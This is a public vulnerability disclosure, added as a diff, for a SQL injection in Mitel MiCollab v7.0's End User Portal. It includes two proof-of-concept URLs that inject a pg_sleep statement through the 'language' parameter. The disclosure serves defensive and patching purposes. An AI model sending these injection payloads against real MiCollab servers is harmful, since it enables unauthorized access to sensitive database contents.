@@ -1,0 +1,49 @@
+================
+Exploit Title: SQL Injection Vulnerability in MiCollab v7.0
+Date: 3-22-2016
+Vendor Homepage: http://www.mitel.com
+Vendor: Mitel
+Software: MiCollab End User Portal
+Version: v7.0 
+Advisory: http://www.mitel.com/security-advisories/mitel-product-security-advisory-16-0001
+CVSS: 7.5
+
+
+Product Summary
+================
+Mitel MiCollab delivers unified messaging, mobility, teleworking, and audio, web and video conferencing services tailored to the needs of today's mobile workforce. (http://www.mitel.com/products/collaboration-software/mitel-micollab)
+
+
+Vulnerabilities
+================
+A SQL injection vulnerability has been identified in MiCollab 7.0 which, if successfully exploited, could allow an attacker to access sensitive information in the MiCollab database. (http://www.mitel.com/security-advisories/mitel-product-security-advisory-16-0001)
+
+The vulnerability is due to the unsanitized 'language' parameter in the 'mywindow' and 'PortletSelector' scripts.
+
+ 
+Proof of concept
+================
+http://server/portal/portal/portal/portal/mywindow?portlets=&page=org.apache.jetspeed.om.page.impl.ContentPageImpl%40d57dde06&language=en_US';SELECT%20pg_sleep(5);--
+http://server/portal/portal/portal/PortletSelector?portlets=&page=org.apache.jetspeed.om.page.impl.ContentPageImpl%40d57dde06&language=en_US';SELECT%20pg_sleep(5);--
+
+
+Timeline
+================
+2016-02-01: Vendor advisory published
+2016-03-22: PoC details published
+
+
+Discovered by
+================
+Goran Tuzovic -- Goran [at] illumant.com
+
+
+References
+================
+1. http://www.mitel.com/products/collaboration-software/mitel-micollab
+2. http://www.mitel.com/security-advisories/mitel-product-security-advisory-16-0001
+
+
+About Illumant
+================
+Illumant has conducted thousands of security assessment and compliance engagements, helping over 800 clients protect themselves from cyber-attacks.  Through meticulous manual analysis, Illumant helps companies navigate the security and threat landscape to become more secure, less of a target, and more compliant.  For more information, visit https://illumant.com/
